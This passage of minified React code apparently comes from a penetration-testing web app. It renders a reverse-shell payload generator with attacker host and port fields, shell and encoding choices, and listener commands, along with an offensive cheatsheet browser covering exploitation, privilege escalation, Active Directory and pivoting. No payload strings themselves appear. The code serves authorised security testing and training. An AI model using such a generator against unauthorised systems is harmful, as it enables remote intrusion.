dark:border-slate-800 text-[10px] font-mono font-bold text-slate-700 dark:text-slate-300 hover:text-cyan-700 dark:hover:text-cyber-cyan transition-all active:scale-95",title:"Set to Active Target IP",children:"TARGET"}),e.jsx("button",{type:"button",onClick:()=>{U("127.0.0.1"),g&&p("toggle")},className:"h-8 px-2 flex items-center rounded-lg bg-slate-100 hover:bg-slate-200 dark:bg-slate-950/80 dark:hover:bg-slate-800 border border-slate-300 dark:border-slate-800 text-[10px] font-mono font-bold text-slate-700 dark:text-slate-300 hover:text-cyan-700 dark:hover:text-cyber-cyan transition-all active:scale-95",title:"Set to localhost",children:"127.0.0.1"})]}),e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx("span",{className:"text-[11px] font-bold text-emerald-700 dark:text-cyber-emerald uppercase tracking-wider",children:"LPORT:"}),e.jsxs("div",{className:"inline-flex items-center h-8 rounded-lg bg-slate-100 dark:bg-slate-950/80 border border-slate-300 dark:border-slate-800 p-0.5 shadow-inner focus-within:border-emerald-500 dark:focus-within:border-cyber-emerald focus-within:ring-1 focus-within:ring-emerald-500/30 transition-all",children:[e.jsx("button",{type:"button",onClick:()=>d(-1),className:"w-7 h-7 flex items-center justify-center rounded-md text-slate-500 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white hover:bg-white dark:hover:bg-slate-800 transition-all active:scale-95",title:"Decrease port (-1)",children:e.jsx(tr,{className:"w-3.5 h-3.5 stroke-[2.5]"})}),e.jsx("input",{type:"text",id:"revshell-lport-input",name:"revshell-lport","aria-label":"Reverse Shell LPORT",value:L,onChange:r=>u(r.target.value),placeholder:"4444",className:"w-14 h-7 text-center bg-transparent text-emerald-800 dark:text-cyber-emerald text-xs font-mono font-bold tracking-wider focus:outline-none selection:bg-emerald-500/30"}),e.jsx("button",{type:"button",onClick:()=>d(1),className:"w-7 h-7 flex items-center justify-center rounded-md text-slate-500 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white hover:bg-white dark:hover:bg-slate-800 transition-all active:scale-95",title:"Increase port (+1)",children:e.jsx(je,{className:"w-3.5 h-3.5 stroke-[2.5]"})})]}),e.jsx("div",{className:"hidden sm:inline-flex items-center gap-1 p-0.5 rounded-lg bg-slate-100/80 dark:bg-slate-950/60 border border-slate-200 dark:border-slate-800/80",children:Cr.map(r=>{const o=L===r;return e.jsx("button",{type:"button",onClick:()=>{u(r),g&&p("toggle")},className:`h-7 px-2.5 flex items-center justify-center rounded-md text-[11px] font-mono font-bold transition-all active:scale-95 ${o?"bg-emerald-600 dark:bg-cyber-emerald text-white dark:text-slate-950 shadow-[0_0_10px_rgba(16,185,129,0.35)] dark:shadow-[0_0_12px_rgba(0,255,159,0.4)]":"text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white hover:bg-white dark:hover:bg-slate-800/80"}`,children:r},r)})})]}),e.jsxs("div",{className:"flex items-center gap-1.5",children:[e.jsx("span",{className:"text-[11px] font-bold text-purple-700 dark:text-purple-400 uppercase tracking-wider",children:"SHELL:"}),e.jsx("div",{className:"inline-flex items-center gap-1 p-0.5 rounded-lg bg-slate-100/80 dark:bg-slate-950/60 border border-slate-200 dark:border-slate-800/80",children:["/bin/bash","/bin/sh","powershell","cmd.exe"].map(r=>{const o=X===r;return e.jsx("button",{type:"button",onClick:()=>{oe(r),g&&p("toggle")},className:`h-7 px-2 flex items-center rounded-md text-[11px] font-mono transition-all active:scale-95 ${o?"bg-purple-600 dark:bg-cyber-purple text-white dark:text-slate-950 font-bold shadow-[0_0_10px_rgba(168,85,247,0.35)] dark:shadow-[0_0_12px_rgba(176,38,255,0.4)]":"text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white hover:bg-white dark:hover:bg-slate-800/80 font-medium"}`,children:r.replace("/bin/","")},r)})})]})]}),e.jsxs("div",{className:"flex flex-wrap items-center justify-between gap-2",children:[e.jsx("div",{className:"flex items-center gap-1 overflow-x-auto pb-1 max-w-full scrollbar-none",children:[{id:"All",label:"All",count:Me.length},{id:"Linux",label:"🐧 Linux"},{id:"Windows",label:"🪟 Windows"},{id:"Web",label:"🌐 Web/PHP"},{id:"PentestMonkey",label:"🐒 PentestMonkey"},{id:"MSFVenom",label:"💣 MSFVenom"},{id:"HoaxShell",label:"🛡️ HoaxShell"},{id:"TTY",label:"📟 TTY"}].map(r=>e.jsxs("button",{onClick:()=>{A(r.id),g&&p("toggle")},className:`px-2.5 py-1 rounded-lg text-xs font-mono font-semibold whitespace-nowrap transition-all ${v===r.id?"bg-cyan-500 text-black shadow-glow-cyan/20 font-bold":"bg-cyber-card hover:bg-cyber-border border border-cyber-border text-cyber-muted hover:text-slate-900 dark:hover:text-white"}`,children:[r.label,"count"in r&&e.jsxs("span",{className:"ml-1 opacity-70",children:["(",r.count,")"]})]},r.id))}),e.jsxs("div",{className:"relative flex-1 sm:max-w-xs min-w-[200px]",children:[e.jsx(Je,{className:"w-3.5 h-3.5 absolute left-2.5 top-1/2 -translate-y-1/2 text-cyber-muted"}),e.jsx("input",{type:"text",id:"revshell-search-input",name:"revshell-search","aria-label":"Filter reverse shell payloads",value:R,onChange:r=>Z(r.target.value),placeholder:`Filter ${V.length} payloads...`,className:"w-full pl-8 pr-7 py-1 rounded-lg bg-cyber-card border border-cyber-border text-xs text-slate-900 dark:text-white placeholder-cyber-muted focus:border-cyber-cyan focus:outline-none"}),R&&e.jsx("button",{onClick:()=>Z(""),className:"absolute right-2 top-1/2 -translate-y-1/2 text-cyber-muted hover:text-slate-900 dark:hover:text-white",children:e.jsx(Qe,{className:"w-3.5 h-3.5"})})]})]}),e.jsx("div",{className:"p-2 rounded-xl bg-cyber-card/60 border border-cyber-border/70 max-h-36 overflow-y-auto scrollbar-thin",children:e.jsx("div",{className:"flex flex-wrap gap-1.5",children:V.length===0?e.jsx("div",{className:"text-cyber-muted text-xs p-2",children:"No reverse shells matched your query."}):V.map(r=>{const o=r.id===E;return e.jsxs("button",{onClick:()=>{F(r.id),g&&p("click")},className:`px-2 py-1 rounded-md text-xs font-mono transition-all flex items-center gap-1.5 ${o?"bg-emerald-500 dark:bg-cyber-emerald text-black font-bold shadow-sm":"bg-slate-100 dark:bg-cyber-bg hover:bg-slate-200 dark:hover:bg-cyber-card border border-slate-300 dark:border-cyber-border text-slate-800 dark:text-slate-300 hover:text-slate-950 dark:hover:text-white"}`,title:`${r.name} (${r.language}) - ${r.platform}`,children:[e.jsx("span",{children:r.name}),r.isFullScript&&e.jsx("span",{className:`text-[9px] px-1 py-0.2 rounded uppercase ${o?"bg-black/20 text-black":"bg-purple-100 dark:bg-cyber-purple/20 text-purple-900 dark:text-cyber-purple"}`,children:"FILE"})]},r.id)})})}),e.jsxs("div",{className:"rounded-xl bg-white dark:bg-cyber-card border border-cyan-400/50 dark:border-cyber-cyan/40 shadow-lg overflow-hidden",children:[e.jsxs("div",{className:"px-3.5 py-2 bg-slate-100 dark:bg-cyber-bg/95 border-b border-slate-200 dark:border-cyber-border flex flex-wrap items-center justify-between gap-2",children:[e.jsxs("div",{className:"flex items-center gap-2 min-w-0",children:[e.jsx("span",{className:"w-2 h-2 rounded-full bg-cyber-cyan animate-pulse"}),e.jsx("span",{className:"font-bold text-slate-900 dark:text-white text-xs truncate",children:w.name}),e.jsx("span",{className:"text-[10px] px-1.5 py-0.2 rounded bg-cyan-100 dark:bg-cyber-cyan/10 border border-cyan-300 dark:border-cyber-cyan/30 text-cyan-900 dark:text-cyber-cyan font-bold",children:w.platform}),e.jsx("span",{className:"text-[10px] px-1.5 py-0.2 rounded bg-purple-100 dark:bg-cyber-purple/10 border border-purple-300 dark:border-cyber-purple/30 text-purple-900 dark:text-cyber-purple font-mono",children:w.language}),w.notes&&e.jsxs("span",{className:"text-[10px] text-slate-600 dark:text-cyber-muted truncate hidden md:inline",children:["(",w.notes,")"]})]}),e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsxs("div",{className:"flex items-center gap-0.5 bg-slate-200/70 dark:bg-cyber-card border border-slate-300 dark:border-cyber-border rounded-lg p-0.5",children:[e.jsx("span",{className:"text-[9px] font-mono font-bold text-slate-600 dark:text-cyber-muted uppercase px-1 hidden sm:inline select-none",children:"ENC:"}),["RAW","URL","BASE64","BASH_B64","PS_ENC"].map(r=>e.jsx("button",{onClick:()=>{pe(r),g&&p("toggle")},className:`px-1.5 py-0.5 rounded text-[10px] font-mono transition-colors ${$===r?"bg-cyber-cyan text-black font-bold shadow-sm":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"}`,title:`Encode payload with ${r.replace("_"," ")}`,children:r.replace("_"," ")},r))]}),e.jsxs("div",{className:"hidden lg:flex items-center gap-0.5 bg-slate-200/70 dark:bg-cyber-card border border-slate-300 dark:border-cyber-border rounded-lg p-0.5",children:[e.jsx("span",{className:"text-[9px] font-mono font-bold text-slate-600 dark:text-cyber-muted uppercase px-1 select-none",children:"WRAP:"}),["none","bash -c","cmd /c"].map(r=>e.jsx("button",{onClick:()=>{Y(r),g&&p("toggle")},className:`px-1.5 py-0.5 rounded text-[10px] font-mono transition-colors ${M===r?"bg-cyber-purple text-white font-bold shadow-sm":"text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white"}`,title:r==="none"?"Direct execution without shell wrapper":`Wrap payload in ${r}`,children:r==="none"?"DIRECT":r},r))]}),(w.isFullScript||w.extension)&&e.jsxs("button",{onClick:j,className:"px-2 py-1 rounded-lg bg-slate-100 hover:bg-slate-200 dark:bg-cyber-bg dark:hover:bg-cyber-border border border-slate-300 dark:border-cyber-border text-slate-800 dark:text-white text-xs font-bold flex items-center gap-1 transition-colors",title:`Download as ${w.extension||".sh"} file`,children:[e.jsx(rr,{className:"w-3.5 h-3.5 text-cyber-cyan"}),e.jsxs("span",{className:"hidden sm:inline",children:["Save ",w.extension]})]}),e.jsx("button",{onClick:x,className:`px-3 py-1 rounded-lg font-bold text-xs transition-all flex items-center gap-1.5 shadow-sm ${W?"bg-cyber-emerald text-black shadow-glow-emerald/30":"bg-cyber-cyan hover:bg-cyber-cyan/90 text-black shadow-glow-cyan/20"}`,children:W?e.jsxs(e.Fragment,{children:[e.jsx(de,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"COPIED!"})]}):e.jsxs(e.Fragment,{children:[e.jsx(ce,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"COPY PAYLOAD"})]})})]})]}),e.jsx("div",{className:"p-3 bg-slate-950 border-t border-slate-800 font-mono text-xs overflow-x-auto max-h-72 scrollbar-thin",children:e.jsx("pre",{className:"text-emerald-400 whitespace-pre-wrap break-all leading-relaxed select-all",children:i})})]}),e.jsxs("div",{className:"p-2.5 rounded-xl bg-white dark:bg-cyber-card border border-slate-200 dark:border-cyber-border flex flex-wrap items-center justify-between gap-2",children:[e.jsxs("div",{className:"flex items-center gap-2 min-w-0",children:[e.jsx(he,{className:"w-4 h-4 text-emerald-600 dark:text-cyber-emerald flex-shrink-0"}),e.jsx("span",{className:"text-[11px] font-bold text-emerald-800 dark:text-cyber-emerald uppercase",children:"LISTENER:"}),e.jsx("div",{className:"flex items-center gap-1 overflow-x-auto max-w-md scrollbar-none",children:Tr.map(r=>e.jsx("button",{onClick:()=>{me(r.id),g&&p("toggle")},className:`px-1.5 py-0.5 rounded text-[10px] font-mono whitespace-nowrap transition-colors ${y===r.id?"bg-emerald-100 dark:bg-cyber-emerald/20 text-emerald-900 dark:text-cyber-emerald border border-emerald-300 dark:border-cyber-emerald/60 font-bold":"bg-slate-100 hover:bg-slate-200 dark:bg-cyber-bg dark:hover:bg-cyber-card text-slate-600 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white border border-slate-200 dark:border-cyber-border"}`,children:r.label},r.id))})]}),e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx("code",{className:"px-2.5 py-1 rounded bg-slate-950 border border-slate-800 text-emerald-400 font-mono text-xs select-all",children:c}),e.jsx("button",{onClick:k,className:`p-1.5 rounded-lg border transition-all ${N?"bg-cyber-emerald text-black border-cyber-emerald":"bg-slate-100 hover:bg-slate-200 dark:bg-cyber-bg dark:hover:bg-cyber-border text-slate-700 dark:text-white border-slate-300 dark:border-cyber-border"}`,title:"Copy listener command",children:N?e.jsx(de,{className:"w-3.5 h-3.5"}):e.jsx(ce,{className:"w-3.5 h-3.5"})})]})]})]})},_r=[{value:"network",label:"01. Network Discovery & Port Scanning"},{value:"web",label:"02. Web Enumeration & Fuzzing"},{value:"exploitation",label:"03. Exploitation & Payloads"},{value:"linux-privesc",label:"04. Linux PrivEsc & TTY"},{value:"active-directory",label:"05. Windows & Active Directory"},{value:"pivoting",label:"06. Pivoting & Tunneling"},{value:"file-transfer",label:"07. File Transfers"}],Hr=({defaultMode:a})=>{var gt;const C=sr(),{cheatsheets:B,globalVars:g,setGlobalVars:D,addCustomCommand:L,deleteCustomCommand:ne,toggleStarCommand:U,soundEnabled:u,customNotes:E=[],deletedNoteIds:F=[],addCustomNote:X,deleteNote:oe,restoreDeletedNotes:v,userNotes:A=[],clearUserNotes:R,setNotesImportModalOpen:Z}=Be(ar(t=>({cheatsheets:t.cheatsheets,globalVars:t.globalVars,setGlobalVars:t.setGlobalVars,addCustomCommand:t.addCustomCommand,deleteCustomCommand:t.deleteCustomCommand,toggleStarCommand:t.toggleStarCommand,soundEnabled:t.soundEnabled,customNotes:t.customNotes,deletedNoteIds:t.deletedNoteIds,addCustomNote:t.addCustomNote,deleteNote:t.deleteNote,restoreDeletedNotes:t.restoreDeletedNotes,userNotes:t.userNotes,clearUserNotes:t.clearUserNotes,setNotesImportModalOpen:t.setNotesImportModalOpen}))),$=nr(),pe=a==="cpts-manual"||C.pathname.includes("note")||C.pathname.includes("manual")||C.search.includes("manual")||C.search.includes("cpts"),[M,Y]=n.useState(pe?"cpts-manual":"tactical"),[y,me]=n.useState("en"),[W,le]=n.useState("all"),[N,ie]=n.useState("ALL"),[w,V]=n.useState("ALL"),[i,c]=n.useState({"01 Information Gathering & Recon":!0}),[d,x]=n.useState(null),[k,j]=n.useState({"folder-00 _Methodology":!0,"folder-01 Information Gathering":!0,"folder-02 Pre-Exploitation":!0,"folder-03 Exploitation":!0,"folder-04 Post-Exploitation":!0,"folder-05 Lateral Movement":!0,"folder-06 NetExec":!0}),[r,o]=n.useState(!1),[S,H]=n.useState(void 0),[T,h]=n.useState("cards"),[f,se]=n.useState("number"),[b,m]=n.useState({}),[G,Q]=n.useState({}),[I,ee]=n.useState(!1),[z,Oe]=n.useState(""),[De,tt]=n.useState(null),[rt,ae]=n.useState(30),[st,Ct]=n.useState({}),[ye,Le]=n.useState(""),Ce=n.useDeferredValue(ye),[we,at]=n.useState(null),[nt,te]=n.useState(null);n.useEffect(()=>{a?Y(a):(C.pathname.includes("note")||C.pathname.includes("manual")||C.search.includes("manual")||C.search.includes("cpts"))&&Y("cpts-manual");const t=new URLSearchParams(C.search),s=t.get("note");if(s){const _=kt(s);_&&(te(_),Y("cpts-manual"))}const l=t.get("category")||t.get("cat")||t.get("tab");l&&(le(l),Y("tactical"))},[a,C.pathname,C.search]);const[Tt,We]=n.useState(!1),[Ue,ot]=n.useState(""),[lt,Pt]=n.useState("linux-privesc"),[it,ct]=n.useState(""),[Ve,dt]=n.useState(""),[pt,mt]=n.useState(""),[ue,Ge]=n.useState("auto"),Ee=(t,s)=>{navigator.clipboard.writeText(t),at(s),u&&p("copy"),setTimeout(()=>{at(null)},2e3)},ze=t=>{if(!t.commands||t.commands.length===0)return;const s=t.commands.map(l=>fe(l,g)).join(`

`);Ee(s,`all-${t.id}`)},_t=t=>{t.preventDefault(),!(!Ue.trim()||!Ve.trim())&&(L({title:Ue.trim(),category:lt,description:it.trim(),commandTemplate:Ve.trim(),tags:pt.split(",").map(s=>s.trim()).filter(Boolean)}),u&&p("root"),We(!1),ot(""),ct(""),dt(""),mt(""))},ut=n.useMemo(()=>B.filter(t=>{if(W==="starred"){if(!t.isStarred)return!1}else if(W==="custom"){if(!t.isCustom)return!1}else if(W!=="all"&&W!=="revshell"&&t.category!==W)return!1;if(Ce.trim()){const s=Ce.toLowerCase(),l=t.title.toLowerCase().includes(s),_=t.description.toLowerCase().includes(s),O=t.commandTemplate.toLowerCase().includes(s),be=t.tags.some(q=>q.toLowerCase().includes(s));if(!l&&!_&&!O&&!be)return!1}return!0}),[B,W,Ce]),P=n.useMemo(()=>{const t=new Set(F),l=(A&&A.length>0?A:St).filter(O=>!t.has(O.id));return[...E.filter(O=>!t.has(O.id)),...l]},[F,E,A]),qe=n.useMemo(()=>yr(P),[P]);n.useMemo(()=>wr(P),[P]);const Rt=n.useMemo(()=>{const t=new Set;for(const s of P)if(s.relPath&&s.relPath.includes("/")){const l=s.relPath.split("/");t.add(l.slice(0,-1).join("/"))}return Array.from(t).sort()},[P]),J=n.useMemo(()=>{let t=vr(Ce,N,w,P);if(d){const s=d.replace(/\\/g,"/").toLowerCase();t=t.filter(l=>{const _=(l.relPath||"").replace(/\\/g,"/").toLowerCase(),O=(l.category||"").toLowerCase();return _===s||_.startsWith(s+"/")||_.includes("/"+s+"/")||O===s||O.startsWith(s)})}return f==="number"?kr(t):f==="title"?[...t].sort((s,l)=>(s.titleEn||s.title).localeCompare(l.titleEn||l.title)):t},[Ce,N,w,P,d,f]),Ie=n.useMemo(()=>Sr(N,P),[N,P]),xt=n.useMemo(()=>{if(w==="ALL")return[];const t=Ie.find(s=>s.group===w);return t?t.leaves:[]},[Ie,w]),ht=n.useMemo(()=>{if(T!=="grouped")return[];const t={};for(const s of J){const{group:l}=Ae(s.subCategory);t[l]||(t[l]=[]),t[l].push(s)}return Object.entries(t).map(([s,l])=>({group:s,count:l.length,notes:l})).sort((s,l)=>l.count-s.count)},[J,T]),ve=n.useMemo(()=>J.slice(0,rt),[J,rt]),Ot=n.useMemo(()=>J.reduce((t,s)=>t+(s.commands?s.commands.length:0),0),[J]),Lt=t=>{x(d===t?null:t),ie("ALL"),V("ALL"),ae(30),u&&p("click")},Et=t=>{j(s=>({...s,[t]:!s[t]})),u&&p("click")},It=()=>{const t={},s=l=>{for(const _ of l)_.isFolder&&(t[_.id]=!0,s(_.children))};s(qe),j(t),u&&p("click")},Ft=()=>{j({}),u&&p("click")},Fe=(t,s)=>{const l=s||"this field note";window.confirm(`Delete field note "${l}"?

You can restore deleted notes at any time using the restore button in the sidebar.`)&&(oe(t),u&&p("root"))},[$e,Ke]=n.useState(!1);n.useEffect(()=>{if($e){const t=setTimeout(()=>Ke(!1),4e3);return()=>clearTimeout(t)}},[$e]);const At=async()=>{if(!$e){Ke(!0);return}await R(),u&&p("root"),Ke(!1),Y("tactical")},bt=()=>{window.confirm(`Restore all ${F.length} deleted field notes back into your active manual?`)&&(v(),u&&p("flag"))},Mt=t=>{X(t),u&&p("root")},Ht=t=>{if(ee(!1),Oe(""),tt(t.id),u&&p("root"),N!=="ALL"&&N!==t.category)ie(t.category),V("ALL");else if(w!=="ALL"){const{group:s}=Ae(t.subCategory);w!==s&&V("ALL")}ae(s=>Math.max(s,60)),T==="quick-index"&&m(s=>({...s,[t.id]:!0})),setTimeout(()=>{const s=document.getElementById(`cpts-note-${t.id}`);s&&s.scrollIntoView({behavior:"smooth",block:"center"})},150),setTimeout(()=>{tt(null)},3e3)};return e.jsxs("div",{className:"space-y-6 w-full font-mono pb-12",children:[e.jsxs(re.div,{initial:{opacity:0,y:-10},animate:{opacity:1,y:0},transition:{duration:.3},className:"p-4 rounded-xl border border-cyber-border bg-cyber-card/90 shadow-md flex flex-wrap items-center justify-between gap-4",children:[e.jsxs("div",{className:"space-y-2",children:[e.jsxs("div",{className:"flex items-center gap-3 flex-wrap",children:[e.jsx("h1",{className:"text-lg font-bold text-slate-900 dark:text-white tracking-wider flex items-center gap-2 select-none",children:M==="cpts-manual"?e.jsxs(e.Fragment,{children:[e.jsx(K,{className:"w-5 h-5 text-purple-600 dark:text-purple-400"}),e.jsx("span",{children:"OFFENSIVE FIELD MANUAL & OBSIDIAN VAULT"})]}):e.jsxs(e.Fragment,{children:[e.jsx(he,{className:"w-5 h-5 text-cyan-600 dark:text-cyber-cyan"}),e.jsx("span",{children:"DYNAMIC TACTICAL SNIPPETS & PAYLOAD LAB"})]})}),M==="tactical"?e.jsxs("div",{className:"flex items-center gap-2 select-none",children:[e.jsxs("div",{className:"inline-flex items-center gap-2 px-3 py-1.5 rounded-lg border border-cyan-500/30 bg-cyan-500/10 text-cyan-800 dark:text-cyan-300 font-mono font-bold text-xs shadow-sm",children:[e.jsx(he,{className:"w-3.5 h-3.5 text-cyan-600 dark:text-cyan-400"}),e.jsx("span",{children:"Tactical Snippets"}),e.jsx("span",{className:"px-1.5 py-0.2 rounded bg-cyan-500/20 text-cyan-700 dark:text-cyan-300 text-[10px] font-semibold",children:B.length})]}),e.jsxs("button",{type:"button",onClick:()=>{Y("cpts-manual"),$("/field-manual")},className:"inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg border border-purple-500/30 bg-purple-500/10 hover:bg-purple-500/20 text-purple-800 dark:text-purple-300 text-xs font-semibold transition-all",title:"Switch to Obsidian Field Manual",children:[e.jsx(K,{className:"w-3.5 h-3.5 text-purple-500"}),e.jsx("span",{children:"Field Manual Vault →"})]}),e.jsxs("button",{type:"button",onClick:()=>{u&&p("click"),Z(!0)},className:"inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg border border-purple-500/40 bg-purple-100 dark:bg-purple-950/40 hover:bg-purple-200 dark:hover:bg-purple-900/60 text-purple-900 dark:text-purple-300 text-xs font-semibold transition-all shadow-sm cursor-pointer",title:"Import your Obsidian Vault (.ZIP or folder)",children:[e.jsx(Pe,{className:"w-3.5 h-3.5 text-purple-600 dark:text-purple-400"}),e.jsx("span",{children:"Import Vault"})]})]}):e.jsxs("div",{className:"flex items-center gap-1 bg-cyber-bg p-1 rounded-lg border border-cyber-border text-xs",children:[e.jsxs("button",{type:"button",onClick:()=>{Y("tactical"),Le("")},className:"px-3 py-1 rounded font-bold transition-all flex items-center gap-1.5 text-cyber-muted hover:text-white",children:[e.jsx(he,{className:"w-3.5 h-3.5"}),e.jsxs("span",{children:["Tactical Snippets (",B.length,")"]})]}),e.jsxs("div",{className:"px-3 py-1 rounded font-bold flex items-center gap-1.5 bg-purple-600 text-white shadow-md shadow-purple-600/40",children:[e.jsx(K,{className:"w-3.5 h-3.5"}),e.jsxs("span",{children:["Offensive Field Manual (",P.length,")"]})]}),e.jsxs("button",{type:"button",onClick:()=>{u&&p("click"),Z(!0)},className:"px-2.5 py-1 text-xs font-mono font-medium rounded bg-purple-100 dark:bg-purple-950/40 hover:bg-purple-200 dark:hover:bg-purple-900/60 text-purple-900 dark:text-purple-300 border border-purple-300 dark:border-purple-500/40 hover:border-purple-400 transition-all flex items-center gap-1.5 shadow-sm",title:"Import or manage your local private offensive field notes vault (IndexedDB)",children:[e.jsx(Pe,{className:"w-3 h-3 text-purple-400"}),e.jsx("span",{children:A.length>0?`Vault (${A.length})`:"Import Notes"})]}),(A.length>0||P.length>0)&&e.jsxs("button",{type:"button","data-testid":"header-delete-notes-btn",onClick:At,className:`px-2.5 py-1 text-xs font-mono font-medium rounded transition-all flex items-center gap-1.5 shadow-sm border ${$e?"bg-rose-600 text-white border-rose-500 font-bold animate-pulse":"bg-rose-100 dark:bg-rose-950/40 hover:bg-rose-200 dark:hover:bg-rose-900/60 text-rose-800 dark:text-rose-300 border-rose-300 dark:border-rose-500/40 hover:border-rose-400"}`,title:$e?"Click again to permanently wipe and delete all notes from local vault":"Delete / Wipe all notes from vault",children:[e.jsx(Se,{className:"w-3 h-3 text-rose-500 dark:text-rose-400"}),e.jsx("span",{children:$e?`Confirm Delete (${P.length||A.length})?`:`Delete (${P.length||A.length})`})]}),F.length>0&&e.jsxs("button",{type:"button",onClick:bt,className:"px-2.5 py-1 text-xs font-mono font-medium rounded bg-amber-100 dark:bg-amber-950/40 hover:bg-amber-200 dark:hover:bg-amber-900/60 text-amber-900 dark:text-amber-300 border border-amber-300 dark:border-amber-500/40 hover:border-amber-400 transition-all flex items-center gap-1.5 shadow-sm",title:"Restore deleted notes back to vault",children:[e.jsx(or,{className:"w-3 h-3 text-amber-500 dark:text-amber-400"}),e.jsxs("span",{children:["Restore (",F.length,")"]})]})]})]}),e.jsx("p",{className:"text-xs text-cyber-muted",children:M==="tactical"?"Real-time parameter injection across network scanning, web exploitation, Active Directory, and reverse shells.":P.length>0?`Private local vault active (${P.length} notes) with dynamic parameter injection and Obsidian Markdown reading view.`:"Private local-first field manual. Import your Obsidian vault JSON to access playbooks and commands with 0 network leakage."})]}),e.jsxs("div",{className:"flex flex-wrap items-center gap-2 bg-cyber-bg p-1.5 px-3 rounded-lg border border-cyber-border text-xs",children:[e.jsxs("div",{className:"flex items-center gap-1.5",children:[e.jsx("span",{className:"text-cyber-muted text-[10px]",children:"LHOST:"}),e.jsx("input",{type:"text",id:"cheatsheet-lhost-input",name:"cheatsheet-lhost","aria-label":"Attacker Host LHOST",value:g.lhost,onChange:t=>D({lhost:t.target.value}),className:"w-28 bg-white dark:bg-cyber-card px-2 py-1 rounded border border-slate-300 dark:border-cyber-border text-slate-900 dark:text-white text-xs font-semibold focus:outline-none focus:border-cyan-500 transition-all shadow-sm"})]}),e.jsxs("div",{className:"flex items-center gap-1.5",children:[e.jsx("span",{className:"text-cyber-muted text-[10px]",children:"LPORT:"}),e.jsx("input",{type:"text",id:"cheatsheet-lport-input",name:"cheatsheet-lport","aria-label":"Attacker Port LPORT",value:g.lport,onChange:t=>D({lport:t.target.value}),className:"w-16 bg-white dark:bg-cyber-card px-2 py-1 rounded border border-slate-300 dark:border-cyber-border text-slate-900 dark:text-white text-xs font-semibold focus:outline-none focus:border-cyan-500 transition-all shadow-sm"})]}),e.jsxs("div",{className:"flex items-center gap-1.5",children:[e.jsx("span",{className:"text-cyber-muted text-[10px]",children:"TARGET:"}),e.jsx("input",{type:"text",id:"cheatsheet-target-input",name:"cheatsheet-target","aria-label":"Target IP Address",value:g.targetIp,onChange:t=>D({targetIp:t.target.value}),className:"w-28 bg-white dark:bg-cyber-card px-2 py-1 rounded border border-slate-300 dark:border-cyber-border text-emerald-700 dark:text-cyber-emerald font-bold text-xs focus:outline-none focus:border-emerald-500 transition-all shadow-sm"})]}),e.jsxs(re.button,{whileHover:{scale:1.05},whileTap:{scale:.95},onClick:()=>We(!0),className:"flex items-center gap-1 px-3 py-1 rounded bg-cyber-cyan/10 border border-cyber-cyan/40 text-cyber-cyan hover:bg-cyber-cyan hover:text-black font-semibold transition-all ml-1 shadow-glow-cyan/20",children:[e.jsx(je,{className:"w-3.5 h-3.5"})," Add Snippet"]})]})]}),e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-4 gap-4 items-start",children:[e.jsx("div",{className:"space-y-3",children:e.jsxs("div",{className:"p-3 rounded-xl border border-cyber-border bg-cyber-card shadow-md space-y-1 overflow-hidden",children:[e.jsxs("div",{className:"px-2 py-1 text-[10px] uppercase font-bold tracking-wider text-slate-500 dark:text-slate-400 flex items-center justify-between select-none",children:[e.jsx("span",{children:M==="tactical"?"TACTICAL CATEGORIES":"FIELD MANUAL CATEGORIES"}),e.jsx("span",{className:"text-cyan-700 dark:text-cyber-cyan font-mono font-semibold",children:M==="tactical"?B.length:St.length})]}),M==="tactical"?e.jsxs(e.Fragment,{children:[br.map(t=>{const s=W===t.id;return e.jsx(re.button,{whileHover:{x:3},whileTap:{scale:.98},onClick:()=>le(t.id),className:`w-full flex items-center justify-between px-3 py-2 rounded-lg text-xs transition-all text-left relative select-none ${s?"bg-cyan-50 dark:bg-cyan-500/15 text-cyan-900 dark:text-cyan-300 border border-cyan-300 dark:border-cyan-500/40 font-bold shadow-sm":"text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white hover:bg-slate-100 dark:hover:bg-slate-800/60 border border-transparent"}`,children:e.jsx("span",{className:"truncate",children:t.name})},t.id)}),e.jsx("div",{className:"pt-2 border-t border-slate-200 dark:border-cyber-border/70 space-y-1",children:e.jsxs(re.button,{whileHover:{x:3},whileTap:{scale:.98},onClick:()=>le("starred"),className:`w-full flex items-center gap-2 px-3 py-2 rounded-lg text-xs transition-all text-left select-none ${W==="starred"?"bg-amber-50 dark:bg-amber-500/15 text-amber-900 dark:text-amber-300 border border-amber-300 dark:border-amber-500/40 font-bold shadow-sm":"text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white hover:bg-slate-100 dark:hover:bg-slate-800/60 border border-transparent"}`,children:[e.jsx(ft,{className:"w-3.5 h-3.5 text-amber-500 fill-amber-500/20"}),e.jsx("span",{children:"Starred Snippets"})]})})]}):e.jsxs(e.Fragment,{children:[e.jsxs("div",{className:"flex flex-wrap items-center justify-between gap-1.5 pb-1.5 border-b border-purple-200 dark:border-purple-900/30",children:[e.jsxs("span",{className:"text-[10px] text-purple-800 dark:text-purple-300 font-bold uppercase tracking-wider flex items-center gap-1.5 flex-shrink-0",children:[e.jsx(_e,{className:"w-3.5 h-3.5 text-purple-400"}),e.jsx("span",{children:"TREE EXPLORER"})]}),e.jsxs("div",{className:"flex items-center gap-1 flex-wrap",children:[e.jsx("button",{type:"button",onClick:It,className:"px-1.5 py-0.5 rounded bg-slate-100 dark:bg-cyber-bg hover:bg-purple-100 dark:hover:bg-purple-950/40 text-purple-700 dark:text-purple-400 border border-slate-300 dark:border-cyber-border text-[9px] font-mono hover:text-purple-900 dark:hover:text-white transition-colors cursor-pointer",title:"Expand all nested folders",children:"+ All"}),e.jsx("button",{type:"button",onClick:Ft,className:"px-1.5 py-0.5 rounded bg-slate-100 dark:bg-cyber-bg hover:bg-purple-100 dark:hover:bg-purple-950/40 text-purple-700 